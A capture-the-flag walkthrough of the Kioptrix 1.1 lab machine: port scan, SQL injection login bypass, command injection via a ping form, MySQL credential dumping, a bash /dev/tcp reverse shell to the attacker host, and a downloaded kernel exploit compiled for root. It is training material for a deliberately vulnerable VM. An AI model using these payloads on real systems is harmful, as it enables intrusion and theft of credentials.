# Kioptrix 1.1

## Remote

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey:
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            869/udp  status
|_  100024  1            872/tcp  status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2018-04-22T14:47:38+00:00; +4h00m00s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods:
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
3306/tcp open  mysql    MySQL (unauthorized)
```

### Apache 2.0.52

The server is hosting a crude PHP login application. I'm able SQLi this form.

``` shell
curl -v http://192.168.122.61/index.php \
    --data-raw "btnLogin=Login&uname=u&psw=pass' OR 1=1-- "
```

This shows us a form that lets us ping a host. We can exploit this to
get command execution as the 'apache' user. After enumerating the
directory we get the SQL server login credentials.

``` shell
curl -v http://192.168.122.61/pingit.php \
    --data-raw "&submit=submit&ip=127.0.0.1; cat index.php"
```

```
<?php
	mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
	//print "Connected to MySQL<br />";
  	mysql_select_db("webapp");

	if ($_POST['uname'] != ""){
		$username = $_POST['uname'];
		$password = $_POST['psw'];
		$query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
		//print $query."<br>";
		$result = mysql_query($query);

		$row = mysql_fetch_array($result);
		//print "ID: ".$row['id']."<br />";
	}

?>
```

Using this I'm able to query mysql for more users in the webapp database.

```
 curl http://192.168.122.61/pingit.php --data-raw '&submit=submit&ip=; mysql -hlocalhost -ujohn -phiroshima --database=webapp -e "select * from users;"'
; mysql -v -hlocalhost -uroot -phiroshima --database=webapp -e "select * from users;"<pre>--------------
select * from users
--------------

id	username	password
1	admin	5afac8d85f
2	john	66lajGGbla
</pre>%
```

And we can do the same in the mysql user table.

```
curl http://192.168.122.61/pingit.php --data-raw '&submit=submit&ip=; mysql -v -hlocalhost -ujohn -phiroshima --database=mysql -e "select * from user;"'
; mysql -v -hlocalhost -ujohn -phiroshima --database=mysql -e "select * from user;"<pre>--------------
select * from user
--------------

Host	User	Password	Select_priv	Insert_priv	Update_priv	Delete_priv	Create_priv	Drop_priv	Reload_priv	Shutdown_priv	Process_priv	File_priv	Grant_priv	References_priv	Index_priv	Alter_priv	Show_db_priv	Super_priv	Create_tmp_table_priv	Lock_tables_priv	Execute_privRepl_slave_priv	Repl_client_priv	ssl_type	ssl_cipher	x509_issuer	x509_subject	max_questions	max_updates	max_connections
localhost	root	5a6914ba69e02807	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y					0	0	0
localhost.localdomain	root	5a6914ba69e02807	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y	Y					0	0	0
localhost.localdomain			N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N					0	0	0
localhost			N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N					0	0	0
localhost	john	5a6914ba69e02807	Y	Y	Y	Y	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N	N					0	0	0
</pre>%
```

This would be possible to do this using sqlmap.

```
./sqlmap.py -u http://192.168.122.61/index.php --data='btnLogin=Login&psw=aaa&uname=aaa' --level 5 --risk 3 --dump

```

This returns this dump of the database.

```
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
| 1  | admin    | 5afac8d85f |
| 2  | john     | 66lajGGbla |
+----+----------+------------+
```

I can use the same command injection to get a reverse shell.

``` local
nv -lvp 1234
```

```
curl -vi http://192.168.122.61/pingit.php --data-raw '&submit=submit&ip=; bash -i %3e%26 /dev/tcp/192.168.122.1/1234 0%3e%261'
```


## Local

There is a local privilege escalation for CentOS 4.5.

Linux kernel 2.6 < 2.6.19 (32bit) ip_append_data() local ring0 root exploit

```
bash-3.00$ wget 192.168.122.1:8000/9542.c
--13:46:05--  http://192.168.122.1:8000/9542.c
           => `9542.c'
Connecting to 192.168.122.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,643 (2.6K) [text/plain]

    0K ..                                                    100%   86.92 MB/s

13:46:05 (86.92 MB/s) - `9542.c' saved [2643/2643]

bash-3.00$ gcc -o 9542 9542.c
9542.c:109:28: warning: no newline at end of file
bash-3.00$ ./9542
sh: no job control in this shell
sh-3.00# whoami
root
sh-3.00# hostname
kioptrix.level2
```

### Users

#### John
Password = 'GuardTower'
